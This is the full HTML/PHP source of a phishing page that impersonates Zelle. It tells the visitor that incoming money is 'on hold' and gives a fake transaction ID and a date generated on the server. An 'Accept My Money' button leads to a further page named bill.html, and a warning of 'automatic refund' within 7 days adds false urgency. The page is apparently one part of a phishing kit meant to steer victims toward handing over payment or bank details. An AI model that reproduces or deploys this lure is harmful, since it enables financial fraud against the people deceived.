<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
	<link rel="stylesheet" href="css/style.css">
	<link rel="Image/cropped-unnamed-32x32.png" href="Image/cropped-unnamed-32x32.png">
    <link rel="shortcut icon" type="Image/cropped-unnamed-32x32.png" href="Image/cropped-unnamed-32x32.png">
	<script src="https://kit.fontawesome.com/2ff1153782.js" crossorigin="anonymous"></script>
	<script src="js/jquery-3.3.1.js"></script>
	<link href="icofont/icofont.min.css" rel="stylesheet">
	<link rel="stylesheet" href="css/animate.min.css">
	<link rel="stylesheet" href="css/theme.css">
	<script src="bootstrap/js/bootstrap.min.js"></script>
	<script src="https://maps.googleapis.com/maps/api/js"></script>
    
    <title>Accept My Money – Zelle</title>
</head>
<body>
    <div class="container-fluid topbar">
        <style>
           .topbar{
            background-color: #6D1ED4;
           } 
           .heading-title{
            color: #FFFFFF;
            font-family: "Roboto Slab", Sans-serif;
            font-weight: 400;
            font-size: 29px;
           }
           .center-image{
            text-align: center;
           }
           .size-medium{
            font-size: 19px;
            color: #434445;
            font-family: Sans-serif;
           }
           .size-small{
            color: #DE3C3C;
            font-family:  "Roboto slab", Sans-serif;
            font-size: 15px;
           }
    
           @media screen and (min-width:601px) {
            .heading-title{
                text-align: left;
            }
            .headingtitle, .size-medium {
                text-align: left;
            }
           }
           @media screen and (max-width:600px) {
            .heading-title{
                text-align: center;
            }
            .headingtitle, .size-medium{
                text-align: center;
            }
            .buttonnext{
                text-align: center;
            }
            .centerimg2 img{
                width: 100%;
                height: auto;
            }
           }
           
        </style>										
        <div class="container">
            <div class="row">
                <div class="col-md-auto">
                    <a href="http://zellepay.com">
                        <img width="100%" height="auto" src="Image/Z-Header-1024x210.jpg" class="attachment-large size-large" alt="" loading="lazy"  sizes="(max-width: 1024px) 100vw, 1024px">
                    </a>
                </div>     
	        </div>
            <h2 class="heading-title">ZELLE</h2>
        </div>
    </div>
    <section class="subpaddingf">
        <div class="container">
            <h2 class="headingtitle size-default">Transaction Summary</h2>
            <div>
                <span class="divider-separator"> <hr> </span>
            </div>
            
            <div class="center-image subpaddingf">
                <img width="150" height="150" src="Image/Incoming-150x150.jpg" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy">
            </div>

            
            <div class="subpaddingf" >
                    <div class="elementor-widget-container">
                        <h2 class="size-medium">There's an Incoming money sent to you through zelle but it's on hold due to lack of zelle account or missing information on your account. Click below to receive it into your  bank account.</h2>		
                    </div>
            </div>

            <div>
                <div class="elementor-element elementor-element-6134b07 elementor-widget elementor-widget-text-editor" data-id="6134b07" data-element_type="widget" data-widget_type="text-editor.default">
                    <div class="container subpaddingf">
                			<ul style="list-style-type:square;">
                                    <li><strong>Transaction Date: </strong> <?php echo date("F d\, Y"); ?> </li>
                                    <li><strong>Transaction Type:</strong> Zelle Transfer</li>
                                    <li><strong>Transaction ID:</strong> 2WQ4Z3UV32</li>
                            </ul>			
                    </div>
                    </div>
                </div>
            <div class="buttonnext subpaddingf">
                    <a href="bill.html" class="btn btn-primary btn-lg" role="button">
                                <span class="elementor-button-text">Accept My Money</span>
                            </a>
            </div>
        </div>
    </section>

    <section class="subpaddingf">
        <div class="container">
			<h2 class="size-small">Note: Failure to receive it within 7 Days may result to automatic refund to the originator. For more enquiries or notice any suspicious notification, please contact your bank.</h2>		
        </div>
    </section>
    <section class="mypaddings">
        <div class="center-image">
            <img width="490" height="1024" src="Image/Z-miidle1-490x1024.jpg" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy">
        </div>
        <div class="center-image centerimg2">
            <img width="667" height="1024" src="Image/Z-middle2-667x1024.jpg" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy">
        </div>
        <div class="center-image centerimg2">
            <a href="https://youtu.be/IDZa1wRsCYM">
            <img width="741" height="1024" src="Image/Z-middle3-741x1024.jpg" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy">
            </div>
        </div>
        <div class="container">
            
                    <div class="center-image centerimg2">
                        <img width="687vw" height="1024vw" src="Image/Z-footer-687x1024.jpg" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy" >
                    </div>

        </div>
        
       
    </section>
</body>
</html>